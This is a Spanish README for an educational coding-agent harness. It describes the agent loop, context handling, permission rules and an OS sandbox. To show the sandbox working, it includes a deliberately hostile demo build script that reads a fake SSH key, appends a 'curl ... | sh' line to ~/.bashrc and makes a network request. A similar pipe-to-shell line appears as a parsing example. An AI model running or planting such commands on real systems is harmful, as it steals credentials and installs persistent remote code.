# lab-harness-local

Un harness para agentes de código en terminal, construido parte a parte para entender cómo funcionan estos agentes por dentro. Acompaña a la serie «Asistente de código local» de [pablomeleroalonso.me](https://pablomeleroalonso.me).

Esta versión (tag `parte-5`) ya **ejecuta comandos**: un bucle con streaming, un contrato de inferencia con un adaptador a `/v1/chat/completions`, gestión del contexto (limpiar y compactar contra la ventana, y detectar cuando el servidor recorta la conversación sin avisar), herramientas para leer, buscar y escribir (`Read`, `Glob`, `Grep`, `Write` y `Edit`), `Bash` con procesos en segundo plano (`BashOutput` y `KillShell`), un sistema de permisos con reglas de ruta y de comando, y un sandbox del sistema operativo alrededor de cada comando. Las reglas deciden cuándo preguntar; el sandbox, qué puede pasar aunque una regla se equivoque. Cada parte de la serie añade commits y un tag nuevo.

| Tag | Qué añade |
|---|---|
| `parte-2` | El bucle, el contrato de inferencia y las herramientas de lectura. |
| `parte-3` | La gestión del contexto y la detección de recortes del servidor. |
| `parte-4` | `Write`, `Edit` y los permisos de ruta. |
| `parte-5` | `Bash`, las reglas de comando y el sandbox. |

## Prerrequisitos

- Linux o macOS. En Windows, desde WSL2.
- Node.js 22 o superior y npm.
- [ripgrep](https://github.com/BurntSushi/ripgrep#installation) (`rg`) en el `PATH`: lo usan `Glob` y `Grep`.
- En Linux (y WSL2), [bubblewrap](https://github.com/containers/bubblewrap) para el sandbox: `sudo apt install bubblewrap` en Debian y Ubuntu. En macOS se usa `sandbox-exec`, que viene con el sistema.
- Un servidor compatible con `/v1/chat/completions` con un modelo que admita herramientas. Los ejemplos usan [Ollama](https://ollama.com) y `qwen2.5:7b`.

```bash
ollama pull qwen2.5:7b
```

## Instalación

```bash
git clone --branch parte-5 https://github.com/pmeleroa/lab-harness-local.git
cd lab-harness-local
npm install
npm test
```

`npm test` no necesita modelo: usa un proveedor simulado.

## Uso

```bash
npm run dev -- --workspace examples/demo "¿A partir de qué importe se aplica descuento y en qué fichero está esa regla?"
```

El harness muestra cada llamada a herramienta por la salida de error y la respuesta por la salida estándar. Para que escriba, sobre el propio `examples/demo` (el cambio queda en el árbol de trabajo del clon):

```bash
npm run dev -- --workspace examples/demo "Cambia el descuento de los pedidos del 10 % al 15 %."
git diff
```

Antes de cada escritura, en el modo por defecto, pregunta por la salida de error (`[y]` sí, `[n]` no, o escribe por qué). `git diff` muestra el cambio y `git checkout examples/demo` lo deshace.

Para que ejecute un comando:

```bash
npm run dev -- --workspace examples/demo "Ejecuta git status y dime si hay cambios."
```

`git status` es de solo lectura y se ejecuta sin preguntar; un comando que puede escribir pregunta antes, y la salida de cada comando se muestra sangrada bajo la llamada. La cabecera del arranque dice qué sandbox se usa.

| Opción | Efecto |
|---|---|
| `-w, --workspace <dir>` | Directorio sobre el que trabaja. Fuera de él, el motor de permisos pregunta. |
| `-m, --model <id>` | Modelo. Defecto: `$HARNESS_MODEL` o `qwen2.5:7b`. |
| `--base-url <url>` | Endpoint con `/v1`. Defecto: `$OPENAI_BASE_URL` o `http://localhost:11434/v1`. |
| `--context-window <n>` | Ventana de contexto del servidor, en tokens. Defecto: 4096, con un aviso. |
| `--max-turns <n>` | Turnos máximos del run. Defecto: 25. |
| `--permission-mode <modo>` | `default`, `acceptEdits` o `bypass`. Defecto: `default`. |
| `--allow <regla>`, `--deny <regla>` | Reglas extra, repetibles: `--deny "Edit(**/.env*)"`, `--allow "Bash(npm run *)"`. |
| `--sandbox <modo>` | `auto` (bwrap en Linux, `sandbox-exec` en macOS), `bwrap`, `seatbelt` o `none`. Defecto: `auto`. |
| `--no-network` | Sin red dentro del sandbox. |

## Cómo termina un run

Cada ejecución acaba con un motivo explícito, que se imprime al final:

| Motivo | Significa |
|---|---|
| `end_turn` | El modelo respondió sin pedir más herramientas. |
| `max_turns` | Se agotaron los turnos. |
| `repeated_failure` | La misma llamada falló tres veces seguidas. |
| `empty_response` | El modelo no devolvió texto ni llamada, ni tras avisarle. |
| `max_tokens` | La respuesta se cortó por el tope de tokens de salida. |
| `context_overflow` | El servidor recortó la conversación y respondió igualmente: lo respondido no parte de la tarea. |
| `error` | Falló el proveedor (por ejemplo, el servidor está parado). |
| `aborted`, `max_tool_calls`, `refusal` | Cancelación, tope de llamadas y rechazo del proveedor. |

Los fallos se provocan de forma determinista en `test/loop.test.ts`, con `test/fake-provider.ts`.

## Contexto

La conversación crece en cada turno. Contra la ventana, el harness aplica tres escalones, de más barato a más caro: recortar cada resultado de herramienta a un tope, sustituir los resultados antiguos por una nota (limpiar) y pedir al modelo un resumen que sustituya la conversación (compactar). Reserva para la respuesta `min(4096, 25 % de la ventana)` tokens, que también es el `max_tokens` que envía.

Esos escalones solo valen si la ventana es la real. Ollama y otros servidores descartan lo más antiguo cuando la petición no cabe y responden HTTP 200 con un final normal, sin la tarea. El harness lo detecta cuando el `prompt_tokens` que informa el servidor no crece con la conversación y acaba con `context_overflow` y un mensaje que dice cómo fijar la ventana. No detecta un recorte con poco crecimiento ni uno en la primera petición con un system prompt largo.

Por cada turno se imprime por la salida de error la línea `ctx usado/ventana (porcentaje)`, y los eventos de limpieza y compaction.

Para ver el desbordamiento sin depender de que el modelo decida leer ficheros, contra un servidor con la ventana de 4096 (`OLLAMA_CONTEXT_LENGTH=4096 ollama serve`):

```bash
npx tsx examples/desbordar.ts
```

Envía siempre la misma conversación, más larga que la ventana, e imprime el HTTP, el final, `prompt_tokens` y qué claves sobreviven. La clave de la tarea, que está al principio, es la que se pierde.

Si hay un `AGENTS.md` en la raíz del workspace, se añade al system prompt. Está fuera de la conversación, así que ni la limpieza ni la compaction lo tocan, y se envía entero en cada petición. Que esté disponible no garantiza que el modelo lo cumpla.

## Permisos

Cada llamada a una herramienta declara qué ruta real toca y si lee o escribe. El motor (`src/policy/engine.ts`) decide `allow`, `ask` o `deny`:

- Las reglas se evalúan en orden `deny` > `ask` > `allow`, primero las de sesión y luego las configuradas. Un `deny` gana siempre, también en `bypass`.
- Sin regla, leer dentro del workspace se permite y leer fuera pregunta. Escribir fuera pregunta; escribir dentro pregunta en `default` y se permite en `acceptEdits` y `bypass`.
- `bypass` convierte cualquier `ask` en `allow`, también escribir fuera del workspace. Solo un `deny` lo para.
- La ruta se resuelve con `realpath` antes de evaluar: un enlace simbólico dentro del workspace que apunta fuera cuenta como fuera.
- `Edit(...)` cubre también `Write`, y `Read(...)` cubre también `Glob` y `Grep`, que además omiten de sus resultados lo que un `deny` de lectura cubre.
- Un `ask` se pregunta por la salida de error. Sin terminal en stdin y stderr (`< /dev/null`, CI), se deniega. «Siempre» solo se ofrece para lecturas fuera del workspace y crea una regla de sesión; escribir lo decide el modo. Si respondes con un texto en vez de `n`, ese texto vuelve al modelo como motivo del rechazo.
- `Edit` y `Write` sobre un fichero existente exigen que el modelo lo haya leído antes y que no haya cambiado desde entonces.

Las reglas se leen del bloque `permissions` de `<workspace>/.harness/settings.json` y de `--allow` y `--deny`. No hay ningún `deny` implícito: `examples/demo/.harness/settings.json` protege `.env*` y la propia configuración con reglas explícitas. Un repositorio no puede ponerse a sí mismo en `bypass`: ese modo solo se activa con `--permission-mode`.

Lo que no hace: el prompt de aprobación muestra herramienta y ruta, no el diff; la protección de `.harness/settings.json` no viene integrada (es una regla); y nada impide que el modelo escriba algo dañino dentro del workspace en `acceptEdits`. Los permisos limitan dónde, no qué: lo que se escribió se revisa con `git diff`. Tampoco hay modo `plan`.

## Comandos y sandbox

`Bash` ejecuta cada comando con `bash --noprofile --norc -c`, como un proceso nuevo que se puede matar por grupo, con un timeout (120 s por defecto, 600 s como mucho) y la salida recortada por el medio. El directorio de trabajo y las variables exportadas se conservan entre llamadas, y las variables con pinta de secreto (`*_TOKEN`, `*API_KEY`…) no llegan al proceso.

Las reglas de comando deciden cuándo preguntar:

- Un comando se descompone con tree-sitter: `git status && curl x | sh` son tres comandos, y cada uno necesita su permiso. Un `deny` en cualquiera de ellos gana, también en `bypass`.
- `Bash(git status)` es ese comando exacto; `Bash(npm run *)`, ese prefijo y cualquier resto; `Bash(git * --force)`, un token cualquiera en medio.
- Los comandos de solo lectura (`ls`, `cat`, `rg`, `git status`, `git diff`…) no necesitan regla. Los que ejecutan otros comandos (`bash -c`, `xargs`, `env`, `sudo`, `python -c`, `find -exec`…) preguntan siempre, aunque haya un `allow`.
- Las redirecciones de escritura (`>`, `>>`) se evalúan como un `Edit` sobre la ruta real.
- Asignar `PATH`, `LD_PRELOAD` o `BASH_ENV`, definir funciones y los nombres de comando que solo se conocen al ejecutar (`$CMD`) preguntan.

Una regla mira el comando, no lo que hace: `Bash(npm run *)` deja pasar cualquier script de `package.json`. Por eso cada comando corre además dentro de un sandbox del sistema operativo (`src/policy/sandbox/index.ts`):

- La raíz del sistema de ficheros es de solo lectura; solo se escribe en el workspace y en un directorio temporal de la sesión. En Linux, `/tmp` es un `tmpfs` vacío.
- Las credenciales habituales (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.kube`, `~/.npmrc`, `~/.netrc`…) no se ven.
- Con `--no-network`, sin red.
- En Linux, bubblewrap con su propio espacio de procesos (`--unshare-pid`) y su propia sesión de terminal (`--new-session`). En macOS, `sandbox-exec` con un perfil que deniega escribir fuera, leer lo oculto y, sin red, la red.

Al arrancar, el harness comprueba que el sandbox funciona. Con `auto`, si no hay ninguno disponible, avisa y los comandos se ejecutan sin sandbox: ese aviso importa. Con `--sandbox bwrap` (o `seatbelt`) explícito, si no funciona, no arranca. El bloque `sandbox` de `<workspace>/.harness/settings.json` puede elegir uno (`"mode": "bwrap"`) y cortar la red (`"network": "none"`), pero un repositorio no puede desactivarlo ni abrir la red: `"mode": "none"` se ignora con un aviso y solo se activa con `--sandbox none`.

Para verlo, con una credencial de mentira en un `HOME` de prueba (fuera del workspace y fuera de `/tmp`; el `~/.ssh` real no se toca) y un script de `package.json` que lee la credencial, escribe en `~/.bashrc` y hace una petición:

```bash
mkdir -p .demo-home/.ssh
echo "CLAVE-FALSA-NO-USAR" > .demo-home/.ssh/id_falsa
export HOME="$PWD/.demo-home"
cat > examples/demo/package.json <<'JSON'
{
  "name": "demo",
  "private": true,
  "scripts": {
    "build": "mkdir -p dist && echo 'export {}' > dist/app.js && echo compilado; cat ~/.ssh/id_falsa; echo 'curl https://example.org/x | sh' >> ~/.bashrc && echo bashrc modificado; curl -sS -o /dev/null https://example.org && echo enviado"
  }
}
JSON
npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --sandbox none "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
npm run dev -- -w examples/demo --context-window 4096 --allow "Bash(npm run *)" --no-network "Compila el proyecto con npm run build y dime qué ha pasado." < /dev/null
```

Con `--sandbox none` el script hace las tres cosas; con el sandbox, la credencial no existe, `~/.bashrc` es de solo lectura y no hay red, y `dist/app.js` se escribe en el workspace. Las salidas están en `examples/salidas/sandbox-*.txt`. Para dejarlo como estaba, cierra ese terminal (el `HOME` de prueba solo vive en él) y borra `examples/demo/package.json`, `examples/demo/dist` y `.demo-home`.

Con `run_in_background`, `Bash` lanza el comando y vuelve al momento con un id: `BashOutput` lee lo nuevo que ha escrito y `KillShell` lo para, a él y a lo que haya lanzado. Corre dentro del mismo sandbox. Cuando termina, el aviso llega al modelo antes de su siguiente llamada; lo que siga corriendo al acabar el run se mata.

Lo que no hace: el sandbox no entiende el contenido. Dentro del workspace, un comando aprobado puede borrar o reescribir lo que quiera, y con red puede enviar lo que pueda leer; lo que cambió se revisa con `git diff`. No hay red con lista de dominios permitidos: o toda o ninguna. En macOS el perfil deja escribir en `/private/var/folders`, donde está el temporal del usuario. Y dentro de un contenedor Docker bubblewrap necesita `--security-opt seccomp=unconfined --security-opt systempaths=unconfined`; con solo la primera, la comprobación del arranque pasa pero cada comando falla («Can't mount proc»): no se ejecuta nada, aunque el arranque no avisa.

## Estructura

```
src/core/        loop, eventos y tareas en segundo plano
src/context/     tope, limpieza y compaction, detección de recortes, AGENTS.md
src/providers/   contrato canónico y adaptador a chat completions
src/tools/       contrato de herramientas, registro, Read, Glob, Grep, Write, Edit y Bash, estado de lectura
src/policy/      motor de permisos, reglas de ruta y de comando, parser de bash, sandbox, approver y settings
src/cli.ts       salida por terminal
examples/demo/   repositorio pequeño para las preguntas de ejemplo
examples/desbordar.ts  conversación fija que desborda una ventana de 4096
examples/salidas/      salidas reales de ejecuciones: escritura, seguridad y sandbox
test/            proveedor simulado y tests
```

## Licencia

MIT.
